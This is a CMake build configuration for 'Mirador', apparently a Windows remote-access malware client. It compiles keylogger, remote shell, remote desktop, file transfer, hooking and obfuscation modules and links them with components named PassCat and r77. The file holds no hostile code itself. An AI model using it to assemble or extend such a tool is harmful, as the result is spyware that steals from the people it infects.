project(Mirador CXX)

################################################################################
# Source groups
################################################################################
set(Fichiers_d27en-tte
    "Client.h"
    "common.h"
    "Hook.h"
    "NetworkHelper.h"
    "obfuscate.h"
    "Settings.h"
)
source_group("Fichiers d%27en-tête" FILES ${Fichiers_d27en-tte})

set(Fichiers_d27en-tte__Module
    "FileTransfer.h"
    "Keylogger.h"
    "RemoteDesktop.h"
    "RemoteShell.h"
)
source_group("Fichiers d%27en-tête\\Module" FILES ${Fichiers_d27en-tte__Module})

set(Fichiers_sources
    "Client.cpp"
    "main.cpp"
    "Settings.cpp"
)
source_group("Fichiers sources" FILES ${Fichiers_sources})

set(Fichiers_sources__Module
    "FileTransfer.cpp"
    "Keylogger.cpp"
    "RemoteDesktop.cpp"
    "RemoteShell.cpp"
)
source_group("Fichiers sources\\Module" FILES ${Fichiers_sources__Module})

set(ALL_FILES
    ${Fichiers_d27en-tte}
    ${Fichiers_d27en-tte__Module}
    ${Fichiers_sources}
    ${Fichiers_sources__Module}
)

################################################################################
# Target
################################################################################
add_executable(${PROJECT_NAME} ${ALL_FILES})

use_props(${PROJECT_NAME} "${CMAKE_CONFIGURATION_TYPES}" "${DEFAULT_CXX_PROPS}")
set(ROOT_NAMESPACE Mirador)

set_target_properties(${PROJECT_NAME} PROPERTIES
    VS_GLOBAL_KEYWORD "Win32Proj"
)
if("${CMAKE_VS_PLATFORM_NAME}" STREQUAL "x64")
    set_target_properties(${PROJECT_NAME} PROPERTIES
        INTERPROCEDURAL_OPTIMIZATION_RELEASE "TRUE"
    )
elseif("${CMAKE_VS_PLATFORM_NAME}" STREQUAL "x86")
    set_target_properties(${PROJECT_NAME} PROPERTIES
        INTERPROCEDURAL_OPTIMIZATION_RELEASE "TRUE"
    )
endif()
################################################################################
# Compile definitions
################################################################################
if("${CMAKE_VS_PLATFORM_NAME}" STREQUAL "x64")
    target_compile_definitions(${PROJECT_NAME} PRIVATE
        "$<$<CONFIG:Debug>:"
            "_DEBUG"
        ">"
        "$<$<CONFIG:Release>:"
            "NDEBUG"
        ">"
        "_CONSOLE;"
        "UNICODE;"
        "_UNICODE"
    )
elseif("${CMAKE_VS_PLATFORM_NAME}" STREQUAL "x86")
    target_compile_definitions(${PROJECT_NAME} PRIVATE
        "$<$<CONFIG:Debug>:"
            "_DEBUG"
        ">"
        "$<$<CONFIG:Release>:"
            "NDEBUG"
        ">"
        "WIN32;"
        "_CONSOLE;"
        "UNICODE;"
        "_UNICODE"
    )
endif()

################################################################################
# Compile and link options
################################################################################
if(MSVC)
    if("${CMAKE_VS_PLATFORM_NAME}" STREQUAL "x64")
        target_compile_options(${PROJECT_NAME} PRIVATE
            $<$<CONFIG:Debug>:
                ${DEFAULT_CXX_DEBUG_RUNTIME_LIBRARY}
            >
            $<$<CONFIG:Release>:
                /Oi;
                ${DEFAULT_CXX_RUNTIME_LIBRARY};
                /Gy
            >
            /permissive-;
            /sdl;
            /W3;
            ${DEFAULT_CXX_DEBUG_INFORMATION_FORMAT};
            ${DEFAULT_CXX_EXCEPTION_HANDLING}
        )
    elseif("${CMAKE_VS_PLATFORM_NAME}" STREQUAL "x86")
        target_compile_options(${PROJECT_NAME} PRIVATE
            $<$<CONFIG:Debug>:
                /MTd
            >
            $<$<CONFIG:Release>:
                /O1;
                /Oi;
                /MT;
                /Gy
            >
            /permissive-;
            /std:c++17;
            /sdl;
            /W3;
            ${DEFAULT_CXX_DEBUG_INFORMATION_FORMAT};
            ${DEFAULT_CXX_EXCEPTION_HANDLING}
        )
    endif()
    if("${CMAKE_VS_PLATFORM_NAME}" STREQUAL "x64")
        target_link_options(${PROJECT_NAME} PRIVATE
            $<$<CONFIG:Debug>:
                /INCREMENTAL
            >
            $<$<CONFIG:Release>:
                /OPT:REF;
                /OPT:ICF;
                /INCREMENTAL:NO
            >
            /DEBUG;
            /SUBSYSTEM:CONSOLE
        )
    elseif("${CMAKE_VS_PLATFORM_NAME}" STREQUAL "x86")
        target_link_options(${PROJECT_NAME} PRIVATE
            $<$<CONFIG:Debug>:
                /SUBSYSTEM:CONSOLE;
                /INCREMENTAL
            >
            $<$<CONFIG:Release>:
                /SUBSYSTEM:WINDOWS;
                /OPT:REF;
                /OPT:ICF;
                /INCREMENTAL:NO
            >
            /DEBUG
        )
    endif()
endif()

################################################################################
# Dependencies
################################################################################
add_dependencies(${PROJECT_NAME}
    PassCat
    r77
)

# Link with other targets.
target_link_libraries(${PROJECT_NAME} PUBLIC
    PassCat
    r77
)

